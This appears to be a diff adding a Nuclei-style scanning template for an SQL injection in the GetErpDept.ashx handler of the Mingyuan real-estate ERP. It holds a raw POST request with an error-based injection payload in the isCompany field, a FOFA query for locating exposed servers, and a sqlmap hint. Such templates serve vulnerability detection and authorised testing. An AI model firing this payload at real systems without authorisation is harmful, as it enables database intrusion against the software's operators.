@@ -1,0 +1,27 @@
+id: mydc-ERP-GetErpDept-sqli
+info:
+  name: 明源地产 ERP GetErpDept - sqli
+  author: leadlife
+  severity: high
+  metadata:
+    verified: true
+    fofa-query: title="明源地产ERP" && icon_hash="-1520670993"
+    tips: isCompany is injection
+    sqlmap: sqlmap -r sqls.txt 
+  tags: mydc, sqli
+http:
+  - raw:
+      - |-
+        POST /XmjdUI/Handle/GetErpDept.ashx HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        Content-Length: 67
+
+        isCompany=') and CONVERT(varchar(MAX), 0x7879757565616c6e, 0)>1-- -
+
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code == 200
+          - contains_all(body,'varchar','xyuuealn')
+        condition: and
